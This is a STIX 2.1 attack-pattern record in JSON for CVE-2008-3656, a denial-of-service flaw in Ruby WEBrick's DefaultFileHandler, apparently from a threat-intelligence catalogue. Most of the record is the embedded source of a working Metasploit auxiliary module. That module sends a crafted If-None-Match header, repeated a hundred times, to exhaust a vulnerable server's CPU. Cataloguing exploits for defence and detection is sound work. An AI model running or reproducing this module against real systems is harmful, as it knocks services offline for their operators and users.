{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--044c0a1d-fa1f-42f5-af61-2d0d45330457",
    "created": "2024-08-14T16:26:28.451065Z",
    "modified": "2024-08-14T16:26:28.451069Z",
    "name": "Ruby WEBrick::HTTP::DefaultFileHandler DoS",
    "description": " The WEBrick::HTTP::DefaultFileHandler in WEBrick in Ruby 1.8.5 and earlier, 1.8.6 to 1.8.6-p286, 1.8.7 to 1.8.7-p71, and 1.9 to r18423 allows for a DoS (CPU consumption) via a crafted HTTP request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/webrick_regex.rb",
            "external_id": "webrick_regex.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3656"
        },
        {
            "source_name": "reference",
            "url": "http://www.ruby-lang.org/en/news/2008/08/08/multiple-vulnerabilities-in-ruby/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ruby WEBrick::HTTP::DefaultFileHandler DoS',\n      'Description'    => %q{\n        The WEBrick::HTTP::DefaultFileHandler in WEBrick in\n        Ruby 1.8.5 and earlier, 1.8.6 to 1.8.6-p286, 1.8.7\n        to 1.8.7-p71, and 1.9 to r18423 allows for a DoS\n        (CPU consumption) via a crafted HTTP request.\n      },\n      'Author'         => 'kris katterjohn',\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        [ 'BID', '30644'],\n        [ 'CVE', '2008-3656'],\n        [ 'OSVDB', '47471' ],\n        [ 'URL', 'http://www.ruby-lang.org/en/news/2008/08/08/multiple-vulnerabilities-in-ruby/']\n      ],\n      'DisclosureDate' => '2008-08-08'))\n\n    register_options([\n      OptString.new('URI', [ true, 'URI to request', '/' ])\n    ])\n  end\n\n  def run\n    begin\n      o = {\n        'uri' => normalize_uri(datastore['URI']),\n        'headers' => {\n          'If-None-Match' => %q{foo=\"\"} + %q{bar=\"baz\" } * 100\n        }\n      }\n\n      c = connect(o)\n      c.send_request(c.request_raw(o))\n\n      print_status(\"Request sent to #{rhost}:#{rport}\")\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_status(\"Couldn't connect to #{rhost}:#{rport}\")\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-08-08"
}